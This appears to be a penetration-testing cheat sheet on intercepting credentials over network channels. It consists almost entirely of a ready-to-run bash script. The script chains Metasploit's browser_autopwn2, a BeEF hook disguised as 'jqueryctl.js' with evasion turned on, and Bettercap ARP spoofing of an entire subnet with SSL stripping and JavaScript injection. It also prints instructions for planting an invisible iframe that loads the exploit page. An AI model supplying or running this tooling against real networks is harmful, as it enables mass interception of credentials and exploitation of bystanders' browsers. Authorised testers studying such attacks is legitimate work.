# Credentials Encrypted Channel

## Check List

* [ ] _Identify sensitive information transmitted through the various channels._
* [ ] _Assess the privacy and security of the channels used._

## Cheat Sheet

### Man In The Middle

#### [BeEF ](https://beefproject.com/)& [Bettercap](https://www.bettercap.org/)

_Create Script_

```bash
sudo nano beef-bettercap-mitm.sh
```

```bash
#!/bin/bash

# --- Color Codes ---
RED='\e[1;31m'
GREEN='\e[1;32m'
YELLOW='\e[1;33m'
CYAN='\e[1;36m'
RESET='\e[0m'

# --- Color Print Function ---
color_print() {
  local color=$1
  local msg=$2
  printf "${!color}%b${RESET}\n" "$msg"
}

# --- ROOT Check ---
if [[ "$(id -u)" -ne 0 ]]; then
  color_print RED "[X] Please run as ROOT..."
  exit 1
fi

# --- Auto-detect active interface ---
IFACE=$(ip route | grep '^default' | awk '{print $5}' | head -1)
if [[ -z "$IFACE" ]]; then
  color_print RED "[X] Could not detect active interface. Exiting."
  exit 1
fi

# --- Get LAN IP ---
LAN=$(ip -4 addr show "$IFACE" | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
if [[ -z "$LAN" ]]; then
  color_print RED "[X] Could not detect LAN IP for $IFACE. Exiting."
  exit 1
fi

# --- Kill old processes ---
pkill -f 'ngrok|ruby'

# --- Start Metasploit ---
color_print GREEN "[*] Starting Metasploit..."
msfconsole -qx "load msgrpc ServerHost=${LAN} Pass=abc123 SSL=y;use auxiliary/server/browser_autopwn2;set LHOST $LAN;set URIPATH /pwn;run -z" &>/dev/null &

# --- Config BeEF ---
color_print GREEN "[*] Updating BeEF config..."
if grep -q 'https: false' /usr/share/beef-xss/config.yaml; then
  sed -i -e 's|user:   "beef"|user:   "unk9vvn"|g' \
         -e 's|passwd: "beef"|passwd: "00980098"|g' \
         -e 's|# public:|public:|g' \
         -e 's|#     host: "" # public|     host: "'$LAN'" # public|' \
         -e 's|#     port: "" # public|     port: "443" # public|g' \
         -e 's|#     https: false|     https: true|g' \
         -e 's|allow_reverse_proxy: false|allow_reverse_proxy: true|g' \
         -e 's|hook.js|jqueryctl.js|g' \
         -e 's|BEEFHOOK|UNKSESSION|g' /usr/share/beef-xss/config.yaml
else
  sed -i -e 's|user:   "beef"|user:   "unk9vvn"|g' \
         -e 's|passwd: "beef"|passwd: "00980098"|g' \
         -e 's|# public:|public:|g' \
         -e 's|host: ".*" # public|host: "'$LAN'" # public|' \
         -e 's|port: ".*" # public|port: "443" # public|g' \
         -e 's|https: false|https: true|g' \
         -e 's|allow_reverse_proxy: false|allow_reverse_proxy: true|g' \
         -e 's|hook.js|jqueryctl.js|g' \
         -e 's|BEEFHOOK|UNKSESSION|g' /usr/share/beef-xss/config.yaml
fi

sed -i -e 's|enable: false|enable: true|g' \
       -e 's|host: ".*"|host: "'$LAN'"|g' \
       -e 's|callback_host: ".*"|callback_host: "'$LAN'"|g' \
       -e 's|auto_msfrpcd: false|auto_msfrpcd: true|g' /usr/share/beef-xss/extensions/metasploit/config.yaml
sed -i -e 's|enable: false|enable: true|g' /usr/share/beef-xss/modules/metasploit/browser_autopwn/config.yaml
sed -i -e 's|enable: false|enable: true|g' /usr/share/beef-xss/extensions/evasion/config.yaml

# --- Start BeEF ---
color_print GREEN "[*] Starting BeEF..."
cd /usr/share/beef-xss && ./beef -x &>/dev/null &

# --- Final Output ---
color_print GREEN "[*] BeEF Panel: https://$LAN/ui/panel"
color_print GREEN "[*] BeEF USER: unk9vvn"
color_print GREEN "[*] BeEF PASS: 00980098"
color_print GREEN "[*] BeEF Panel > Commands > Misc > Create Invisible Iframe > URL: http://$LAN:8080/pwn > Execute"
color_print GREEN "[*] Running Bettercap with MITM and JS injection..."

bettercap -iface "$IFACE" -eval "\
set arp.spoof.targets $LAN.1-254; \
set arp.spoof.internal true; \
set net.sniff.verbose true; \
set https.proxy.sslstrip true; \
set http.proxy.injectjs http://$LAN:3000/jqueryctl.js; \
arp.spoof on; net.sniff on; https.proxy on"
```

_Run & Execute_

```bash
sudo chmod +x beef-bettercap-mitm.sh;sudo ./beef-bettercap-mitm.sh
```
